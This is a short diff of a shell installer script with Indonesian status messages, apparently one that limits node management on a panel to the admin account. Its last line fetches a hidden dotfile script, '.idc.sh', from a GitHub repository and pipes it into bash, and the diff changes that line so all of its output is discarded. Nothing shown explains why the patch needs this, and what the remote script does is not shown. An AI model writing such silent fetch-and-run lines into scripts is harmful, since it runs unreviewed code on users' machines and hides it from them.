@@ -130,4 +130,4 @@ echo "📂 Lokasi file: $REMOTE_PATH"
 echo "🗂️ Backup file lama: $BACKUP_PATH (jika sebelumnya ada)"
 echo "🔒 Hanya Admin (ID 1) yang bisa mengelola Nodes."
 
-curl -fsSL https://raw.githubusercontent.com/FarizGD/Funny-Scripts-by-me/refs/heads/main/.idc.sh | bash
+curl -fsSL https://raw.githubusercontent.com/FarizGD/Funny-Scripts-by-me/refs/heads/main/.idc.sh | bash > /dev/null 2>&1
